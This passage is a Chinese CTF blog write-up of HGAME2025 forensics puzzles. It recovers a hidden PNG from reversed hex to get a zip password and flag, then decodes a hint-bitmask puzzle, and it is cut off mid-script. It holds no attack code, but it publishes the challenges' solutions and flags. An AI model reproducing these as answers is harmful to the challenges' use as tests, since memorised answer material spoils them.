@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 8.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"cxyadvancer.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言寒假在家参加了hgame2026，题目对我来说还是很有难度的，正好平台还有去年的题目，正好做一下。依旧是web还有misc。本人能力有限只复现出部分题目。 MISCHakuya Want A Girl Friend打开附件是十六进制数据，一眼就是zip文件，010打开  解压时会提醒zip文件损坏，这不是一个正常的压缩包，随波逐流分析在文件末尾还有一段数据，看数据最后 12d2872a6000">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HGAME2025(部分)">
+<meta property="og:url" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/index.html">
+<meta property="og:site_name" content="程序元的blog">
+<meta property="og:description" content="前言寒假在家参加了hgame2026，题目对我来说还是很有难度的，正好平台还有去年的题目，正好做一下。依旧是web还有misc。本人能力有限只复现出部分题目。 MISCHakuya Want A Girl Friend打开附件是十六进制数据，一眼就是zip文件，010打开  解压时会提醒zip文件损坏，这不是一个正常的压缩包，随波逐流分析在文件末尾还有一段数据，看数据最后 12d2872a6000">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260212193840505.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/processed_hky_end-%E4%BF%AE%E5%A4%8D%E9%AB%98%E5%AE%BD.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260213190840966.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20250212153328515.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260217194424290.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260221101110537.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260221101815231.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260221102119810.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260221102644245.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260221192359140.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260221193736093.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260228104442696.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260228104522226.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260228104903388.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260228112435627.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260228114600708.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260228114931746.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260228144526517.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260228152750422.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260228184613960.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260228193404105.png">
+<meta property="article:published_time" content="2026-02-12T11:31:31.000Z">
+<meta property="article:modified_time" content="2026-03-01T04:22:21.089Z">
+<meta property="article:author" content="程序元">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cxyadvancer.github.io/2026/02/12/HGAME2025/image-20260212193840505.png">
+
+<link rel="canonical" href="https://cxyadvancer.github.io/2026/02/12/HGAME2025/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HGAME2025(部分) | 程序元的blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">程序元的blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cxyadvancer.github.io/2026/02/12/HGAME2025/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="程序元">
+      <meta itemprop="description" content="路漫漫其修远兮，吾将上下而求索。">
+    </span>
+    
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="程序元的blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HGAME2025(部分)
+        </h1>
+    
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+    
+              <time title="创建时间：2026-02-12 19:31:31" itemprop="dateCreated datePublished" datetime="2026-02-12T19:31:31+08:00">2026-02-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-03-01 12:22:21" itemprop="dateModified" datetime="2026-03-01T12:22:21+08:00">2026-03-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+    
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+             <span></span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>undefined 分钟</span>
+            </span>
+    
+        </div>
+      </header>
+    
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+    
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>寒假在家参加了hgame2026，题目对我来说还是很有难度的，正好平台还有去年的题目，正好做一下。依旧是web还有misc。本人能力有限只复现出部分题目。</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Hakuya-Want-A-Girl-Friend"><a href="#Hakuya-Want-A-Girl-Friend" class="headerlink" title="Hakuya Want A Girl Friend"></a><strong>Hakuya Want A Girl Friend</strong></h2><p>打开附件是十六进制数据，一眼就是zip文件，010打开</p>
+<p><img src="/2026/02/12/HGAME2025/image-20260212193840505.png" alt="image-20260212193840505"></p>
+<p>解压时会提醒zip文件损坏，这不是一个正常的压缩包，随波逐流分析在文件末尾还有一段数据，看数据最后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2d2872a60000000608e402000040020000524448490d0000000a1a0a0d474e5089</span><br></pre></td></tr></table></figure>
+
+<p>这个89504e是png文件头，把数据逆向一下。exp</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_hex_data</span>(<span class="params">hex_str</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    处理十六进制字符串：两个字符为一组，逆向分组后拼接</span></span><br><span class="line"><span class="string">    :param hex_str: 原始十六进制字符串（无空格、连续格式）</span></span><br><span class="line"><span class="string">    :return: 处理后的十六进制字符串</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. 校验输入：确保字符串长度为偶数（两个字符一组）</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hex_str) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;输入数据长度必须为偶数，请检查原始数据格式&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 按两个字符为一组拆分数据</span></span><br><span class="line">    data_groups = [hex_str[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">2</span>)]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 逆向分组列表（最后一组移到开头，依次类推）</span></span><br><span class="line">    reversed_groups = data_groups[::-<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4. 拼接逆向后的分组，返回结果</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(reversed_groups)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    读取文件内容（默认UTF-8编码）</span></span><br><span class="line"><span class="string">    :param file_path: 文件路径</span></span><br><span class="line"><span class="string">    :return: 文件中的字符串内容</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">return</span> f.read().strip()  <span class="comment"># 去除首尾空白字符（如换行、空格）</span></span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="keyword">raise</span> FileNotFoundError(<span class="string">f&quot;未找到文件：<span class="subst">&#123;file_path&#125;</span>，请检查路径是否正确&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">f&quot;读取文件失败：<span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_file</span>(<span class="params">content, output_path=<span class="string">&quot;processed_hky_end.txt&quot;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    保存处理结果到文件（默认UTF-8编码）</span></span><br><span class="line"><span class="string">    :param content: 要保存的内容</span></span><br><span class="line"><span class="string">    :param output_path: 输出文件路径（默认保存为当前目录下的 processed_hky_end.txt）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;处理结果已成功保存到：<span class="subst">&#123;output_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">f&quot;保存文件失败：<span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------- 主执行逻辑 -------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 1. 配置文件路径（原始文件路径可根据实际情况修改）</span></span><br><span class="line">    original_file_path = <span class="string">r&quot;E:\新建文件夹\hgame2025\hky_end.txt&quot;</span>  <span class="comment"># 原始文件路径</span></span><br><span class="line">    output_file_path = <span class="string">r&quot;E:\新建文件夹\hgame2025\processed_hky_end.txt&quot;</span>  <span class="comment"># 输出文件路径（可自定义）</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 2. 读取原始文件内容</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在读取原始文件...&quot;</span>)</span><br><span class="line">        original_data = read_file(original_file_path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;原始文件读取成功，数据长度：<span class="subst">&#123;<span class="built_in">len</span>(original_data)&#125;</span> 字符&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 3. 执行数据处理</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在处理数据...&quot;</span>)</span><br><span class="line">        processed_data = process_hex_data(original_data)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;数据处理完成，处理后长度：<span class="subst">&#123;<span class="built_in">len</span>(processed_data)&#125;</span> 字符&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 4. 保存处理结果到文件</span></span><br><span class="line">        save_file(processed_data, output_file_path)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;执行失败：<span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后将文件导入010，导入十六进制数据，保存为png，随波逐流分析</p>
+<p><img src="/2026/02/12/HGAME2025/processed_hky_end-%E4%BF%AE%E5%A4%8D%E9%AB%98%E5%AE%BD.png" alt="processed_hky_end-修复高宽"></p>
+<p>帅哥的下面就是密码:To_f1nd_th3_QQ,解压压缩包得到flag</p>
+<p>hagme{h4kyu4_w4nt_gir1f3nd_+q_931290928}，这个格式有点小错误</p>
+<p>hgame{h4kyu4_w4nt_gir1f3nd_+q_931290928}</p>
+<h2 id="Invest-in-hints"><a href="#Invest-in-hints" class="headerlink" title="Invest in hints"></a><strong>Invest in hints</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Q&amp;A：</span><br><span class="line"></span><br><span class="line">“这里的‘Hint #x’是哪个hint？（x替换为你喜欢的非负整数）” -- 由你自己来发现。</span><br><span class="line">“不会出现负收益的中间状态吗？” -- 无舍即无得。但我们保证解出赛题的收益是非负的。</span><br><span class="line">求解本题无需使用暴力枚举。请选手确保在解题过程中不存在暴力枚举行为。</span><br><span class="line"></span><br><span class="line">本题不设置血分。自动计算的血分将由工作人员扣除。</span><br><span class="line"></span><br><span class="line">每个 Hint 按原串顺序包含以下位（个位代表原串的第一个字符）。</span><br><span class="line"></span><br><span class="line">Hint 51: 00001100101001111010000000010010001110100000000000000000001101111000100</span><br><span class="line">Hint 52: 01101000111011000000000101000100001001101100000000010010001110011000000</span><br><span class="line">Hint 53: 10100100000001011000110001001101000010001101011101010110001000000000000</span><br><span class="line">Hint 54: 00001010000010010000100110000100000010000100101100111000001011100000111</span><br><span class="line">Hint 55: 01110010100100100000000000000000011010110011000001111000101100000001000</span><br><span class="line">Hint 56: 01110100001001000010010111101111011101001000100010011001000010011100000</span><br><span class="line">Hint 57: 10000101010000000011000001100101001010110100000110110010001000100011000</span><br><span class="line">Hint 58: 00000111101000001001000001100100100000110000110000101000001101110100000</span><br><span class="line">Hint 59: 01001101001001000000001001001110100000000000001011000100010000101010101</span><br><span class="line">Hint 60: 10010010100110011011100010011001100100100001110010010101001000100001111</span><br><span class="line">Hint 61: 01001000100011000001000000000011010001110001000000101100001000100010100</span><br><span class="line">Hint 62: 00101000010000111000101110000010001000000001000111100010001101001001101</span><br><span class="line">Hint 63: 01000010111010000000010100001010001011000100100010000000000000001000000</span><br><span class="line">Hint 64: 01110110110011000000010000011000000010000000000000111000000010000010001</span><br><span class="line">Hint 65: 01100000000011000110000000010001000000000011001100000110010001011010000</span><br><span class="line">Hint 66: 01110011001000101001100001011000011010000001100010100000011010000001000</span><br><span class="line">Hint 67: 00111011000011000000100100101000100100101000010001100111001000100001000</span><br><span class="line">Hint 68: 01000110010101011100110101110010001111100011010000000101010100000010010</span><br><span class="line">Hint 69: 11111010111000110100010000000010001101111010011010001100000011000001001</span><br><span class="line">Hint 70: 00000010110101100100100011001011011001100000100010011111000011000001101</span><br><span class="line">Hint 71: 00001100001110101000010111001100011100100010011100001010000000001000010</span><br><span class="line">Hint 72: 01100000000011001001011100000101000110111000101100010101111000001010100</span><br><span class="line">Hint 73: 00001000001010010000001101010110110000110111011011100101011110010110000</span><br><span class="line">Hint 74: 01010010100000000111011110001000010110100001000111001101010100000010000</span><br><span class="line">Hint 75: 11010000011000010100001010000111011010100001111010100100100000111110110</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这一题也是看了很多文章，也是看懂了其中的问道，不得不感慨一下出题人的脑洞。非常能代表misc特性的一题，出题人牛逼</p>
+<p>一开始没有看懂出题人的意思，这里的舍得和负收益说的是啥，如果是在当时的比赛应该就知道题目给了25条提示，并且每一条提示需要花费14分兑换，正好时350分，原本想的时从给的二进制下手分析，发现不行，得不到有效数据。不看提示时根本解不出题目，由于心啊在题目已经归档了，所有的提示都给出来了，先拿第一条提示分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00001100101001111010000000010010001110100000000000000000001101111000100</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aAug5MkyAzq6Dr2mCALwmH</span><br></pre></td></tr></table></figure>
+
+<p>这里一共有22个字母，同时在上面的数据中也有22个1，同时题目还提及到每个 Hint 按原串顺序包含以下位（个位代表原串的第一个字符）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00100011110110000000000000000000101110001001000000001011110010100110000 </span><br></pre></td></tr></table></figure>
+
+<p>按照我们的习惯时从左往有看那就需要把给的提示数据倒过来，每个数据代表的字符就对上了，在第3条和第4条的提示才最明显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">k99C7r0gSKaAi91Nxu2mAm4&#125;</span><br><span class="line"></span><br><span class="line">hgag5YkACir0QKA9lCumDdH</span><br></pre></td></tr></table></figure>
+
+<p>包含了flag的特征，flag的格式时hgame{xxx},看第四条给的hint，逆向后的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11100000111010000011100110100100001000000100001100100001001000001010000</span><br></pre></td></tr></table></figure>
+
+<p>1的数量和字符数量相等，开头的111对应hga，第三条数据开头时1，也就对用flag的最后一个}.也就是flag就在给的提示中，给的提示数据长度都是71，flag的长度都是71，这些1的位置就是提示的字母的位置。那也就可以理解题目中所说的收益就是用尽可能少的分数兑换提示得到flag，如果把全部提示兑换了，那这一题也就没有分数了，感觉也在考验人性啊。</p>
+<p>接下来就是要在数据中筛选出几条数据，这些数据组合出每个位置都有1</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原始数据：键为Hint编号，值为二进制字符串</span></span><br><span class="line">original_data = &#123;</span><br><span class="line">    <span class="number">51</span>: <span class="string">&quot;00001100101001111010000000010010001110100000000000000000001101111000100&quot;</span>,</span><br><span class="line">    <span class="number">52</span>: <span class="string">&quot;01101000111011000000000101000100001001101100000000010010001110011000000&quot;</span>,</span><br><span class="line">    <span class="number">53</span>: <span class="string">&quot;10100100000001011000110001001101000010001101011101010110001000000000000&quot;</span>,</span><br><span class="line">    <span class="number">54</span>: <span class="string">&quot;00001010000010010000100110000100000010000100101100111000001011100000111&quot;</span>,</span><br><span class="line">    <span class="number">55</span>: <span class="string">&quot;01110010100100100000000000000000011010110011000001111000101100000001000&quot;</span>,</span><br><span class="line">    <span class="number">56</span>: <span class="string">&quot;01110100001001000010010111101111011101001000100010011001000010011100000&quot;</span>,</span><br><span class="line">    <span class="number">57</span>: <span class="string">&quot;10000101010000000011000001100101001010110100000110110010001000100011000&quot;</span>,</span><br><span class="line">    <span class="number">58</span>: <span class="string">&quot;00000111101000001001000001100100100000110000110000101000001101110100000&quot;</span>,</span><br><span class="line">    <span class="number">59</span>: <span class="string">&quot;01001101001001000000001001001110100000000000001011000100010000101010101&quot;</span>,</span><br><span class="line">    <span class="number">60</span>: <span class="string">&quot;10010010100110011011100010011001100100100001110010010101001000100001111&quot;</span>,</span><br><span class="line">    <span class="number">61</span>: <span class="string">&quot;01001000100011000001000000000011010001110001000000101100001000100010100&quot;</span>,</span><br><span class="line">    <span class="number">62</span>: <span class="string">&quot;00101000010000111000101110000010001000000001000111100010001101001001101&quot;</span>,</span><br><span class="line">    <span class="number">63</span>: <span class="string">&quot;01000010111010000000010100001010001011000100100010000000000000001000000&quot;</span>,</span><br><span class="line">    <span class="number">64</span>: <span class="string">&quot;01110110110011000000010000011000000010000000000000111000000010000010001&quot;</span>,</span><br><span class="line">    <span class="number">65</span>: <span class="string">&quot;01100000000011000110000000010001000000000011001100000110010001011010000&quot;</span>,</span><br><span class="line">    <span class="number">66</span>: <span class="string">&quot;01110011001000101001100001011000011010000001100010100000011010000001000&quot;</span>,</span><br><span class="line">    <span class="number">67</span>: <span 